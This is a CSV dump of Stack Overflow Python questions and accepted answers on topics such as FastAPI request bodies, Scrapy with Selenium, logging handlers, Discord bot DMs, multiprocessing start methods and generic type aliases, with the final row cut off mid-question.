Id,PostTypeId,Title,Body,AcceptedAnswerId,AcceptedAnswer
"70583980","1","I am unable to create a new virtualenv in ubuntu?","<p>So, I installed virtualenv in ubuntu terminal. I installed using the following commands:</p>
<pre><code>sudo apt install python3-virtualenv
pip install virtualenv
</code></pre>
<p>But when I try creating a new virtualenv using:</p>
<pre><code>virtualenv -p python3 venv
</code></pre>
<p>I am getting the following error:</p>
<pre><code>AttributeError: module 'virtualenv.create.via_global_ref.builtin.cpython.mac_os' has no attribute 'CPython2macOsArmFramework'
</code></pre>
<p>How can I solve it?</p>
","70584013","<p>You don't need to use <code>virtualenv</code>. You can use this:</p>
<pre><code>python3 -m venv ./some_env
</code></pre>
"
"70658748","1","Using FastAPI in a sync way, how can I get the raw body of a POST request?","<p>Using FastAPI in a <strong>sync</strong>, not <code>async</code> mode, I would like to be able to receive the raw, unchanged body of a POST request.</p>
<p>All examples I can find show <code>async</code> code, when I try it in a normal sync way, the <code>request.body()</code> shows up as a coroutine object.</p>
<p>When I test it by posting some <code>XML</code> to this endpoint, I get a <code>500 &quot;Internal Server Error&quot;</code>.</p>
<pre><code>from fastapi import FastAPI, Response, Request, Body

app = FastAPI()

@app.get(&quot;/&quot;)
def read_root():
    return {&quot;Hello&quot;: &quot;World&quot;}

@app.post(&quot;/input&quot;)
def input_request(request: Request):
    # how can I access the RAW request body here?  
    body = request.body()

    # do stuff with the body here  

    return Response(content=body, media_type=&quot;application/xml&quot;)
</code></pre>
<p>Is this not possible with FastAPI?</p>
<p>Note: a simplified input request would look like:</p>
<pre><code>POST http://127.0.0.1:1083/input
Content-Type: application/xml

&lt;XML&gt;
    &lt;BODY&gt;TEST&lt;/BODY&gt;
&lt;/XML&gt;
</code></pre>
<p>and I have no control over how input requests are sent, because I need to replace an existing SOAP API.</p>
","70659178","<h2>Using <code>async def</code> endpoint</h2>
<p>If an object is a co-routine, it needs to be awaited. <a href=""https://fastapi.tiangolo.com/advanced/using-request-directly/"" rel=""nofollow noreferrer"">FastAPI is actually Starlette underneath</a>, and <a href=""https://www.starlette.io/requests/#body"" rel=""nofollow noreferrer"">Starlette methods</a> for returning the request <code>body</code> are <code>async</code> methods (see the source code <a href=""https://github.com/encode/starlette/blob/212fa46b23be0701a5963cdeff14f05ed352e22a/starlette/requests.py#L231"" rel=""nofollow noreferrer"">here</a> as well); thus, one needs to <code>await</code> them (inside an <code>async def</code> endpoint). For example:</p>
<pre class=""lang-py prettyprint-override""><code>from fastapi import Request

@app.post(&quot;/input&quot;)
async def input_request(request: Request):
    return await request.body()
</code></pre>
<h2>Update 1 - Using <code>def</code> endpoint</h2>
<p>Alternatively, if you are confident that the incoming data is a valid <code>JSON</code>, you can define your endpoint with <code>def</code> instead, and use the <a href=""https://fastapi.tiangolo.com/tutorial/body-fields/"" rel=""nofollow noreferrer""><code>Body</code></a> field, as shown below (for more options on how to post <code>JSON</code> data, see <a href=""https://stackoverflow.com/a/70636163/17865804"">this answer</a>):</p>
<pre class=""lang-py prettyprint-override""><code>from fastapi import Body

@app.post(&quot;/input&quot;)
def input_request(payload: dict = Body(...)):
    return payload
</code></pre>
<p>If, however, the incoming data are in <code>XML</code> format, as in the example you provided, one option is to pass them using <a href=""https://fastapi.tiangolo.com/tutorial/request-files/"" rel=""nofollow noreferrer""><code>Files</code></a> instead, as shown below—as long as you have control over how client data are sent to the server (have a look <a href=""https://stackoverflow.com/a/70657621/17865804"">here</a> as well). Example:</p>
<pre class=""lang-py prettyprint-override""><code>from fastapi import File

@app.post(&quot;/input&quot;) 
def input_request(contents: bytes = File(...)): 
    return contents
</code></pre>
<h2>Update 2 - Using <code>def</code> endpoint and <code>async</code> dependency</h2>
<p>As described in <a href=""https://github.com/tiangolo/fastapi/issues/2574#issuecomment-751787209"" rel=""nofollow noreferrer"">this post</a>, you can use an <code>async</code> <a href=""https://fastapi.tiangolo.com/tutorial/dependencies/"" rel=""nofollow noreferrer"">dependency</a> function to pull out the <code>body</code> from the request. You can use <code>async</code> dependencies on <code>non-async</code> (i.e., <code>def</code>) endpoints as well. Hence, if there is some sort of blocking code in this endpoint that prevents you from using <a href=""https://fastapi.tiangolo.com/async/"" rel=""nofollow noreferrer""><code>async</code>/<code>await</code></a>—as I am guessing this might be the reason in your case—this is the way to go.</p>
<p>Note: I should also mention that <a href=""https://stackoverflow.com/a/71517830/17865804"">this answer</a>—which explains the difference between <code>def</code> and <code>async def</code> endpoints (that you might be aware of)—also provides solutions when you are required to use <code>async def</code> (as you might need to <code>await</code> for coroutines inside a route), but also have some <em>synchronous</em> expensive CPU-bound operation that might be blocking the server. Please have a look.</p>
<p>Example of the approach described earlier can be found below. You can uncomment the <code>time.sleep()</code> line, if you would like to confirm yourself that a request won't be blocking other requests from going through, as <a href=""https://fastapi.tiangolo.com/async/#path-operation-functions"" rel=""nofollow noreferrer"">when you declare an endpoint with normal <code>def</code> instead of <code>async def</code>, it is run in an external threadpool</a> (regardless of the <code>async def</code> dependency function).</p>
<pre class=""lang-py prettyprint-override""><code>from fastapi import FastAPI, Depends, Request
import time

app = FastAPI()

async def get_body(request: Request):
    return await request.body()

@app.post(&quot;/input&quot;)
def input_request(body: bytes = Depends(get_body)):
    print(&quot;New request arrived.&quot;)
    #time.sleep(5)
    return body
</code></pre>
"
"70651053","1","How can I send Dynamic website content to scrapy with the html content generated by selenium browser?","<p>I am working on certain stock-related projects where I have had a task to scrape all data on a daily basis for the last 5 years. i.e from 2016 to date. I particularly thought of using selenium because I can use crawler and bot to scrape the data based on the date. So I used the use of button click with selenium and now I want the same data that is displayed by the selenium browser to be fed by scrappy.
This is the <a href=""https://merolagani.com/Floorsheet.aspx"" rel=""nofollow noreferrer"">website</a> I am working on right now.
I have written the following code inside scrappy spider.</p>
<pre><code>class FloorSheetSpider(scrapy.Spider):
    name = &quot;nepse&quot;

    def start_requests(self):

        driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())
        
     
        floorsheet_dates = ['01/03/2016','01/04/2016', up to till date '01/10/2022']

        for date in floorsheet_dates:
            driver.get(
                &quot;https://merolagani.com/Floorsheet.aspx&quot;)

            driver.find_element(By.XPATH, &quot;//input[@name='ctl00$ContentPlaceHolder1$txtFloorsheetDateFilter']&quot;
                                ).send_keys(date)
            driver.find_element(By.XPATH, &quot;(//a[@title='Search'])[3]&quot;).click()
            total_length = driver.find_element(By.XPATH,
                                               &quot;//span[@id='ctl00_ContentPlaceHolder1_PagerControl2_litRecords']&quot;).text
            z = int((total_length.split()[-1]).replace(']', ''))    
            for data in range(z, z + 1):
                driver.find_element(By.XPATH, &quot;(//a[@title='Page {}'])[2]&quot;.format(data)).click()
                self.url = driver.page_source
                yield Request(url=self.url, callback=self.parse)

               
    def parse(self, response, **kwargs):
        for value in response.xpath('//tbody/tr'):
            print(value.css('td::text').extract()[1])
            print(&quot;ok&quot;*200)
</code></pre>
<p>Update: Error after answer is</p>
<pre><code>2022-01-14 14:11:36 [twisted] CRITICAL: 
Traceback (most recent call last):
  File &quot;/home/navaraj/PycharmProjects/first_scrapy/env/lib/python3.8/site-packages/twisted/internet/defer.py&quot;, line 1661, in _inlineCallbacks
    result = current_context.run(gen.send, result)
  File &quot;/home/navaraj/PycharmProjects/first_scrapy/env/lib/python3.8/site-packages/scrapy/crawler.py&quot;, line 88, in crawl
    start_requests = iter(self.spider.start_requests())
TypeError: 'NoneType' object is not iterable
</code></pre>
<p>I want to send current web html content to scrapy feeder but I am getting unusal error for past 2 days any help or suggestions will be very much appreciated.</p>
","70694461","<p>The 2 solutions are not very different. Solution #2 fits better to your question, but choose whatever you prefer.</p>
<p><strong>Solution 1</strong> - create a response with the html's body from the driver and scraping it right away (you can also pass it as an argument to a function):</p>
<pre class=""lang-py prettyprint-override""><code>import scrapy
from selenium import webdriver
from selenium.webdriver.common.by import By
from scrapy.http import HtmlResponse


class FloorSheetSpider(scrapy.Spider):
    name = &quot;nepse&quot;

    def start_requests(self):

        # driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())
        driver = webdriver.Chrome()

        floorsheet_dates = ['01/03/2016','01/04/2016']#, up to till date '01/10/2022']

        for date in floorsheet_dates:
            driver.get(
                &quot;https://merolagani.com/Floorsheet.aspx&quot;)

            driver.find_element(By.XPATH, &quot;//input[@name='ctl00$ContentPlaceHolder1$txtFloorsheetDateFilter']&quot;
                                ).send_keys(date)
            driver.find_element(By.XPATH, &quot;(//a[@title='Search'])[3]&quot;).click()
            total_length = driver.find_element(By.XPATH,
                                               &quot;//span[@id='ctl00_ContentPlaceHolder1_PagerControl2_litRecords']&quot;).text
            z = int((total_length.split()[-1]).replace(']', ''))
            for data in range(1, z + 1):
                driver.find_element(By.XPATH, &quot;(//a[@title='Page {}'])[2]&quot;.format(data)).click()
                self.body = driver.page_source

                response = HtmlResponse(url=driver.current_url, body=self.body, encoding='utf-8')
                for value in response.xpath('//tbody/tr'):
                    print(value.css('td::text').extract()[1])
                    print(&quot;ok&quot;*200)

        # return an empty requests list
        return []
</code></pre>
<p><strong>Solution 2</strong> - with super simple downloader middleware:</p>
<p>(You might have a delay here in <code>parse</code> method so be patient).</p>
<pre class=""lang-py prettyprint-override""><code>import scrapy
from scrapy import Request
from scrapy.http import HtmlResponse
from selenium import webdriver
from selenium.webdriver.common.by import By


class SeleniumMiddleware(object):
    def process_request(self, request, spider):
        url = spider.driver.current_url
        body = spider.driver.page_source
        return HtmlResponse(url=url, body=body, encoding='utf-8', request=request)


class FloorSheetSpider(scrapy.Spider):
    name = &quot;nepse&quot;

    custom_settings = {
        'DOWNLOADER_MIDDLEWARES': {
            'tempbuffer.spiders.yetanotherspider.SeleniumMiddleware': 543,
            # 'projects_name.path.to.your.pipeline': 543
        }
    }
    driver = webdriver.Chrome()

    def start_requests(self):

        # driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())


        floorsheet_dates = ['01/03/2016','01/04/2016']#, up to till date '01/10/2022']

        for date in floorsheet_dates:
            self.driver.get(
                &quot;https://merolagani.com/Floorsheet.aspx&quot;)

            self.driver.find_element(By.XPATH, &quot;//input[@name='ctl00$ContentPlaceHolder1$txtFloorsheetDateFilter']&quot;
                                ).send_keys(date)
            self.driver.find_element(By.XPATH, &quot;(//a[@title='Search'])[3]&quot;).click()
            total_length = self.driver.find_element(By.XPATH,
                                               &quot;//span[@id='ctl00_ContentPlaceHolder1_PagerControl2_litRecords']&quot;).text
            z = int((total_length.split()[-1]).replace(']', ''))
            for data in range(1, z + 1):
                self.driver.find_element(By.XPATH, &quot;(//a[@title='Page {}'])[2]&quot;.format(data)).click()
                self.body = self.driver.page_source
                self.url = self.driver.current_url

                yield Request(url=self.url, callback=self.parse, dont_filter=True)

    def parse(self, response, **kwargs):
        print('test ok')
        for value in response.xpath('//tbody/tr'):
            print(value.css('td::text').extract()[1])
            print(&quot;ok&quot;*200)
</code></pre>
<p>Notice that I've used chrome so change it back to firefox like in your original code.</p>
"
"70709406","1","Import ""matplotlib"" could not be resolved from source Pylance(reportMissingModuleSource)","<p>whenever I try to import matplotlib or matplotlib.pyplot in VS Code I get the error in the title:</p>
<pre><code>Import &quot;matplotlib&quot; could not be resolved from source Pylance(reportMissingModuleSource)
</code></pre>
<p>or</p>
<pre><code>Import &quot;matplotlib.pyplot&quot; could not be resolved from source Pylance(reportMissingModuleSource)
</code></pre>
<p>The hyperlink of the reportMissingModuleSource sends me to <a href=""https://github.com/microsoft/pylance-release/blob/main/DIAGNOSTIC_SEVERITY_RULES.md#diagnostic-severity-rules"" rel=""noreferrer"">https://github.com/microsoft/pylance-release/blob/main/DIAGNOSTIC_SEVERITY_RULES.md#diagnostic-severity-rules</a>, where it says:<br />
<em>&quot;Diagnostics for imports that have no corresponding source file. This happens when a type stub is found, but the module source file was not found, indicating that the code may fail at runtime when using this execution environment. Type checking will be done using the type stub.&quot;</em><br />
However, from the explanation I don't understand exactly what's wrong and what I should do to fix this, can someone help me with this?</p>
","70737017","<p>I can reproduce your question when I select a python interpreter where doesn't exist <code>matplotlib</code>:</p>
<p><a href=""https://i.stack.imgur.com/DYsIw.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/DYsIw.png"" alt=""enter image description here"" /></a></p>
<p>So, the solution is opening an <strong>integrated</strong> Terminal then run <code>pip install matplotlib</code>. After it's installed successfully, please <strong>reload window</strong>, then the warning should go away.</p>
"
"70608619","1","How to get message from logging function?","<p>I have a <code>logger</code> function from <a href=""https://docs.python.org/3/library/logging.html"" rel=""noreferrer""><code>logging</code></a> package that after I call it, I can send the message through <code>logging level</code>.</p>
<p>I would like to send this message also to another function, which is a Telegram function called <code>SendTelegramMsg()</code>.</p>
<p>How can I get the message after I call the funcion <code>setup_logger</code> send a message through <code>logger.info(&quot;Start&quot;)</code> for example, and then send this exatcly same message to <code>SendTelegramMsg()</code> function which is inside <code>setup_logger</code> function?</p>
<p>My currently <code>setup_logger</code> function:</p>
<pre><code># Define the logging level and the file name
def setup_logger(telegram_integration=False):
    &quot;&quot;&quot;To setup as many loggers as you want&quot;&quot;&quot;

    filename = os.path.join(os.path.sep, pathlib.Path(__file__).parent.resolve(), 'logs', str(dt.date.today()) + '.log')
    formatter = logging.Formatter('%(levelname)s: %(asctime)s: %(message)s', datefmt='%m/%d/%Y %H:%M:%S')
    level = logging.DEBUG

    handler = logging.FileHandler(filename, 'a')    
    handler.setFormatter(formatter)

    consolehandler = logging.StreamHandler()
    consolehandler.setFormatter(formatter)

    logger = logging.getLogger('logs')
    if logger.hasHandlers():
        # Logger is already configured, remove all handlers
        logger.handlers = []
    else:
        logger.setLevel(level)
        logger.addHandler(handler)        
        logger.addHandler(consolehandler)

    #if telegram_integration == True:
        #SendTelegramMsg(message goes here)

    return logger
</code></pre>
<p>After I call the function <code>setup_logger()</code>:</p>
<pre><code>logger = setup_logger()
logger.info(&quot;Start&quot;)
</code></pre>
<p>The output:</p>
<pre><code>INFO: 01/06/2022 11:07:12: Start
</code></pre>
<p>How am I able to get this message and send to <code>SendTelegramMsg()</code> if I enable the integration to <code>True</code>?</p>
","70742455","<p>Implement a custom <a href=""https://docs.python.org/3/library/logging.html#logging.Handler"" rel=""noreferrer"">logging.Handler</a>:</p>
<pre class=""lang-py prettyprint-override""><code>class TelegramHandler(logging.Handler):

    def emit(self, record):
        message = self.format(record)
        SendTelegramMsg(message)
        # SendTelegramMsg(message, record.levelno)    # Passing level
        # SendTelegramMsg(message, record.levelname)  # Passing level name
</code></pre>
<p>Add the handler:</p>
<pre class=""lang-py prettyprint-override""><code>def setup_logger(telegram_integration=False):
    # ...

    if telegram_integration:
        telegram_handler = TelegramHandler()
        logger.addHandler(telegram_handler)

    return logger
</code></pre>
<p>Usage, no change:</p>
<pre class=""lang-py prettyprint-override""><code>logger = setup_logger()
logger.info(&quot;Start&quot;)
</code></pre>
"
"70660854","1","How to check if a bot can DM a user","<p>If a user has the privacy setting &quot;Allow direct messages from server members&quot; turned off and a discord bot calls</p>
<pre><code>await user.dm_channel.send(&quot;Hello there&quot;)
</code></pre>
<p>You'll get this error:</p>
<pre><code>discord.errors.Forbidden: 403 Forbidden (error code: 50007): Cannot send messages to this user
</code></pre>
<p>I would like to check whether I can message a user <em>without</em> sending them a message. Trying to send a message and catching this error does not work for me, because I don't want a message to get sent in the event that the bot <em>is</em> allowed to message.</p>
<p>I have tried this:</p>
<pre><code>print(user.dm_channel.permissions_for(bot).send_messages)
</code></pre>
<p>but it always returns True, even if the message is not permitted.</p>
<p>I have also tried this:</p>
<pre><code>channel = await user.create_dm()
if channel is None:
    ...
</code></pre>
<p>but unfortunately, it seems that &quot;has permission to message user&quot; and &quot;has permission to create a dm channel&quot; are considered different.</p>
<p><strong>EDIT</strong></p>
<p>To clarify the exact usage since there seems to be a bit of confusion, take this example. There is a server, and 3 users in question: Me, My Bot, and Steve. Steve has &quot;Allow direct messages from server members&quot; checked off.</p>
<p>The bot has a command called <code>!newgame</code> which accepts a list of users and starts a game amongst them, which involves DMing some of the members of the game. Because of Steve's privacy settings, he cannot play the game (since the bot will need to message him). If I do</p>
<pre><code>!newgame @DJMcMayhem @Steve
</code></pre>
<p>I'd like to provide a response like:</p>
<pre class=""lang-none prettyprint-override""><code>&gt; I can't start a game with that list of users because @Steve has the wrong privacy settings.
</code></pre>
<p>But as far as I know right now, the only way to find out if Steve can play is by first attempting to message every user, which I'd like to avoid.</p>
","70780850","<h2>Explanation</h2>
<p>You can send an invalid message, which would raise a <code>400 Bad Request</code> exception, to the dm_channel. This can be accomplished by setting content to <code>None</code>, for example.</p>
<p>If it raises <code>400 Bad Request</code>, you can DM them. If it raises <code>403 Forbidden</code>, you can't.</p>
<h2>Code</h2>
<pre class=""lang-py prettyprint-override""><code>async def can_dm_user(user: discord.User) -&gt; bool:
    ch = user.dm_channel
    if ch is None:
        ch = await user.create_dm()

    try:
        await ch.send()
    except discord.Forbidden:
        return False
    except discord.HTTPException:
        return True
</code></pre>
"
"70810857","1","split geometric progression efficiently in Python (Pythonic way)","<p>I am trying to achieve a calculation involving geometric progression (split). Is there any effective/efficient way of doing it. The data set has millions of rows.
I need the column &quot;Traded_quantity&quot;</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th></th>
<th></th>
<th>Marker</th>
<th>Action</th>
<th>Traded_quantity</th>
</tr>
</thead>
<tbody>
<tr>
<td>2019-11-05</td>
<td>09:25</td>
<td>0</td>
<td></td>
<td>0</td>
</tr>
<tr>
<td></td>
<td>09:35</td>
<td>2</td>
<td>BUY</td>
<td>3</td>
</tr>
<tr>
<td></td>
<td>09:45</td>
<td>0</td>
<td></td>
<td>0</td>
</tr>
<tr>
<td></td>
<td>09:55</td>
<td>1</td>
<td>BUY</td>
<td>4</td>
</tr>
<tr>
<td></td>
<td>10:05</td>
<td>0</td>
<td></td>
<td>0</td>
</tr>
<tr>
<td></td>
<td>10:15</td>
<td>3</td>
<td>BUY</td>
<td>56</td>
</tr>
<tr>
<td></td>
<td>10:24</td>
<td>6</td>
<td>BUY</td>
<td>8128</td>
</tr>
</tbody>
</table>
</div>
<p>turtle = 2
(User defined)</p>
<p>base_quantity = 1
(User defined)</p>
<pre><code>    def turtle_split(row):
        if row['Action'] == 'BUY':
            return base_quantity * (turtle ** row['Marker'] - 1) // (turtle - 1)
        else:
            return 0
    df['Traded_quantity'] = df.apply(turtle_split, axis=1).round(0).astype(int)
</code></pre>
<h2>Calculation</h2>
<p>For 0th Row, Traded_quantity should be zero (because the Marker is zero)</p>
<p>For 1st Row, Traded_quantity should be (1x1) + (1x2) = 3 (Marker 2 will be split into 1 and 1, First 1 will be multiplied with the base_quantity&gt;&gt;1x1, Second 1 will be multiplied with the result from first 1 times turtle&gt;&gt;1x2), then we make a sum of these two numbers)</p>
<p>For 2nd Row, Traded_quantity should be zero (because the Marker is zero)</p>
<p>For 3rd Row, Traded_quantity should be (2x2) = 4(Marker 1 will be multiplied with the last split from row 1 time turtle i.e 2x2)</p>
<p>For 4th Row, Traded_quantity should be zero(because the Marker is zero)</p>
<p>For 5th Row, Traded_quantity should be (4x2)+(4x2x2)+(4x2x2x2) = 56(Marker 3 will be split into 1,1 and 1, First 1 will be multiplied with the last split from row3 times turtle &gt;&gt;4x2, Second 1 will be multiplied with the result from first 1 with turtle&gt;&gt;8x2), third 1 will be multiplied with the result from second 1 with turtle&gt;&gt;16x2) then we make a sum of these three numbers)</p>
<p>For 6th Row, Traded_quantity should be (32x2)+(32x2x2)+(32x2x2x2)+(32x2x2x2x2)+(32x2x2x2x2x2) = 8128</p>
<p>Whenever there will be a BUY, the traded quantity will be calculated using the last batch from Traded_quantity times turtle.</p>
<p>Turns out the code is generating correct Traded_quantity when there is no zero in Marker. Once there is a gap with a couple of zeros geometric progression will not help, I would require the previous fig(from Cache) to recalculate Traded_q. tried with lru_cache for recursion, didn't work.</p>
","70811799","<p>This should work</p>
<pre><code>def turtle_split(row):
        global base_quantity
        if row['Action'] == 'BUY':
            summation = base_quantity * (turtle ** row['Marker'] - 1) // (turtle - 1)
            base_quantity = base_quantity * (turtle ** (row['Marker'] - 1))*turtle
            return summation
        else:
            return 0
</code></pre>
"
"70565965","1","ERROR: Failed building wheel for numpy , ERROR: Could not build wheels for numpy, which is required to install pyproject.toml-based projects","<p>I`m using python poetry(<a href=""https://python-poetry.org/"" rel=""noreferrer"">https://python-poetry.org/</a>) for dependency management in my project.</p>
<p>Though when I`m running <code>poetry install</code>, its giving me below error.</p>
<pre><code>ERROR: Failed building wheel for numpy
  Failed to build numpy
  ERROR: Could not build wheels for numpy, which is required to install pyproject.toml-based projects

</code></pre>
<p>I`m having python 3.9 installed in my laptop.<br>
I installed numpy 1.21.5 using <code>pip install numpy</code>, I even tried to down version it to 1.19.5.</p>
<p>Though I`m getting the same error.</p>
<p>I found out many people are getting <code>ERROR: Failed building wheel for numpy</code> this error in python 3.10, they solved it by down versioning python to 3.9, though that didnt working for me.</p>
","70566445","<p>I solved it by doing the following steps:-</p>
<ol>
<li><p>I updated the pyproject.toml(This file contains all the library/dependency/dev dependency)with the numpy version that I installed using <code>pip install numpy</code> command.
<a href=""https://i.stack.imgur.com/lEANX.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/lEANX.png"" alt=""enter image description here"" /></a></p>
</li>
<li><p>Run <code>poetry lock</code> to update poetry.lock file(contains details information about the library)
<a href=""https://i.stack.imgur.com/BOqXc.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/BOqXc.png"" alt=""enter image description here"" /></a></p>
</li>
<li><p>Run <code>poetry install</code> again, &amp; it should work fine.</p>
</li>
</ol>
<p>If you are having any problems, you can comment.
I`ll try to answer it.</p>
"
"70546823","1","Pandas - How to Save A Styled Dataframe to Image","<p>I have styled a dataframe output and have gotten it to display how I want it in a Jupyter Notebook but I am having issues find a good way to save this as an image. I have tried <a href=""https://pypi.org/project/dataframe-image/"" rel=""noreferrer"">https://pypi.org/project/dataframe-image/</a> but the way I have this working it seem to be a NoneType as it's a styler object and errors out when trying to use this library.</p>
<p>This is just a snippet of the whole code, this is intended to loop through several 'col_names' and I want to save these as images (to explain some of the coding).</p>
<pre><code>import pandas as pd
import numpy as np

col_name = 'TestColumn'

temp_df = pd.DataFrame({'TestColumn':['A','B','A',np.nan]})

t1 = (temp_df[col_name].fillna(&quot;Unknown&quot;).value_counts()/len(temp_df)*100).to_frame().reset_index()
t1.rename(columns={'index':' '}, inplace=True)
t1[' '] = t1[' '].astype(str) 

display(t1.style.bar(subset=[col_name], color='#5e81f2', vmax=100, vmin=0).set_table_attributes('style=&quot;font-size: 17px&quot;').set_properties(
    **{'color': 'black !important',
       'border': '1px black solid !important'}
).set_table_styles([{
    'selector': 'th',
    'props': [('border', '1px black solid !important')]
}]).set_properties( **{'width': '500px'}).hide_index().set_properties(subset=[&quot; &quot;], **{'text-align': 'left'}))
</code></pre>
<p>[OUTPUT]
<a href=""https://i.stack.imgur.com/T57vB.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/T57vB.jpg"" alt=""enter image description here"" /></a></p>
","70550426","<p>Was able to change how I was using dataframe-image on the styler object and got it working. Passing it into the export() function rather than calling it off the object directly seems to be the right way to do this.</p>
<p>The .render() did get the HTML but was often losing much of the styling when converting it to image or when not viewed with Ipython HTML display. See comparision below.
<a href=""https://i.stack.imgur.com/uauQ9.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/uauQ9.jpg"" alt=""enter image description here"" /></a></p>
<p>Working Code:</p>
<pre><code>import pandas as pd
import numpy as np
import dataframe_image as dfi

col_name = 'TestColumn'

temp_df = pd.DataFrame({'TestColumn':['A','B','A',np.nan]})

t1 = (temp_df[col_name].fillna(&quot;Unknown&quot;).value_counts()/len(temp_df)*100).to_frame().reset_index()
t1.rename(columns={'index':' '}, inplace=True)
t1[' '] = t1[' '].astype(str) 


style_test = t1.style.bar(subset=[col_name], color='#5e81f2', vmax=100, vmin=0).set_table_attributes('style=&quot;font-size: 17px&quot;').set_properties(
    **{'color': 'black !important',
       'border': '1px black solid !important'}
).set_table_styles([{
    'selector': 'th',
    'props': [('border', '1px black solid !important')]
}]).set_properties( **{'width': '500px'}).hide_index().set_properties(subset=[&quot; &quot;], **{'text-align': 'left'})

dfi.export(style_test, 'successful_test.png')
</code></pre>
"
"70552775","1","Multiprocess inherently shared memory in no longer working on python 3.10 (coming from 3.6)","<p>I understand there are a variety of techniques for sharing memory and data structures between processes in python. This question is specifically about this inherently shared memory in python scripts that existed in python 3.6 but seems to no longer exist in 3.10.  <strong>Does anyone know why and if it's possible to bring this back in 3.10?  Or what this change that I'm observing is?</strong>  I've upgraded my Mac to Monterey and it no longer supports python 3.6, so I'm forced to upgrade to either 3.9 or 3.10+.</p>
<p>Note:  I tend to develop on Mac and run production on Ubuntu.  Not sure if that factors in here.  Historically with 3.6, everything behaved the same regardless of OS.</p>
<p>Make a simple project with the following python files</p>
<p><strong>myLibrary.py</strong></p>
<pre><code>MyDict = {}
</code></pre>
<p><strong>test.py</strong></p>
<pre><code>import threading
import time
import multiprocessing

import myLibrary


def InitMyDict():
    myLibrary.MyDict = {'woot': 1, 'sauce': 2}
    print('initialized myLibrary.MyDict to ', myLibrary.MyDict)


def MainLoop():
    numOfSubProcessesToStart = 3
    for i in range(numOfSubProcessesToStart):
        t = threading.Thread(
            target=CoolFeature(),
            args=())
        t.start()

    while True:
        time.sleep(1)


def CoolFeature():
    MyProcess = multiprocessing.Process(
        target=SubProcessFunction,
        args=())
    MyProcess.start()


def SubProcessFunction():
    print('SubProcessFunction: ', myLibrary.MyDict)


if __name__ == '__main__':
    InitMyDict()
    MainLoop()
</code></pre>
<p>When I run this on 3.6 it has a significantly different behavior than 3.10.  I do understand that a subprocess cannot modify the memory of the main process, but it is still super convenient to access the main process' data structure that was previously set up as opposed to moving every little tiny thing into shared memory just to read a simple dictionary/int/string/etc.</p>
<p><strong>Python 3.10 output:</strong></p>
<pre><code>python3.10 test.py 
initialized myLibrary.MyDict to  {'woot': 1, 'sauce': 2}
SubProcessFunction:  {}
SubProcessFunction:  {}
SubProcessFunction:  {}
</code></pre>
<p><strong>Python 3.6 output:</strong></p>
<pre><code>python3.6 test.py 
initialized myLibrary.MyDict to  {'woot': 1, 'sauce': 2}
SubProcessFunction:  {'woot': 1, 'sauce': 2}
SubProcessFunction:  {'woot': 1, 'sauce': 2}
SubProcessFunction:  {'woot': 1, 'sauce': 2}
</code></pre>
<p>Observation:</p>
<p>Notice that in 3.6, the subprocess can view the value that was set from the main process.  But in 3.10, the subprocess sees an empty dictionary.</p>
","70552892","<p>In short, since 3.8, CPython uses the <em>spawn</em> start method on MacOs. Before it used the <em>fork</em> method.</p>
<p>On UNIX platforms, the <em>fork</em> start method is used which means that every new <code>multiprocessing</code> process is an exact copy of the parent at the time of the fork.</p>
<p>The <em>spawn</em> method means that it starts a new Python interpreter for each new <code>multiprocessing</code> process. According to the documentation:</p>
<blockquote>
<p>The child process will only inherit those resources necessary to run the process object’s <code>run()</code> method.</p>
</blockquote>
<p>It will <em>import</em> your program into this new interpreter, so starting processes et cetera sould only be done from within the <code>if __name__ == '__main__':</code>-block!</p>
<p>This means you cannot count on variables from the parent process being available in the children, <em>unless they are module level constants which would be imported</em>.</p>
<p>So the change is significant.</p>
<p><strong>What can be done?</strong></p>
<p>If the required information <em>could</em> be a module-level constant, that would solve the problem in the simplest way.</p>
<p>If that is not possible (e.g. because the data needs to be generated at runtime) you could have the parent write the information to be shared to a file. E.g. in JSON format and before it starts other processes. Then the children could simply read this. That is probably the next simplest solution.</p>
<p>Using a <code>multiprocessing.Manager</code> would allow you to share a <code>dict</code> between processes. There is however a certain amount of overhead associated with this.</p>
<p>Or you could try calling <code>multiprocessing.set_start_method(&quot;fork&quot;)</code> before creating processes or pools and see if it doesn't crash in your case. That would revert to the pre-3.8 method on MacOs. But as documented <a href=""https://bugs.python.org/issue33725"" rel=""nofollow noreferrer"">in this bug</a>, there are real problems with using the <code>fork</code> method on MacOs.
Reading the issue indicates that <code>fork</code> <strong>might</strong> be OK <em>as long as you don't use threads</em>.</p>
"
"70583230","1","Union of generic types that is also generic","<p>Say I have two types (one of them generic) like this</p>
<pre class=""lang-py prettyprint-override""><code>from typing import Generic, TypeVar
T = TypeVar('T')
class A(Generic[T]): pass
class B: pass
</code></pre>
<p>And a union of A and B like this</p>
<pre class=""lang-py prettyprint-override""><code>C = A|B
</code></pre>
<p>Or, in pre-Python-3.10/<a href=""https://www.python.org/dev/peps/pep-0604/"" rel=""nofollow noreferrer"">PEP 604</a>-syntax:</p>
<pre class=""lang-py prettyprint-override""><code>C = Union[A,B]
</code></pre>
<p>How do I have to change the definition of C, so that C is also generic? e.g. if an object is of type <code>C[int]</code>, it is either</p>
<ul>
<li>of type <code>A[int]</code> (type parameter is passed down) or</li>
<li>of type <code>B</code> (type parameter is ignored)</li>
</ul>
","70588199","<p>Rereading the <a href=""https://mypy.readthedocs.io/en/stable/generics.html#generic-type-aliases"" rel=""nofollow noreferrer"">mypy documentation</a> I believe I have found my answer:</p>
<blockquote>
<p>Type aliases can be generic. In this case they can be used in two ways: Subscripted aliases are equivalent to original types with substituted type variables, so the number of type arguments must match the number of free type variables in the generic type alias. Unsubscripted aliases are treated as original types with free variables replaced with Any</p>
</blockquote>
<p>So, to answer my question:</p>
<pre class=""lang-py prettyprint-override""><code>C = A[T]|B
</code></pre>
<p>should do the trick. And it does!</p>
"
"70567344","1","EasyOCR Segmentation fault (core dumped)","<p>I got this issue</p>
<pre><code>pip install easyocr
</code></pre>
<p>on python env</p>
<pre><code>import easyocr
reader = easyocr.Reader(['en'])

result = reader.readtext('./reports/dilate/NP6221833_126.png', workers=1)
</code></pre>
<p>finally</p>
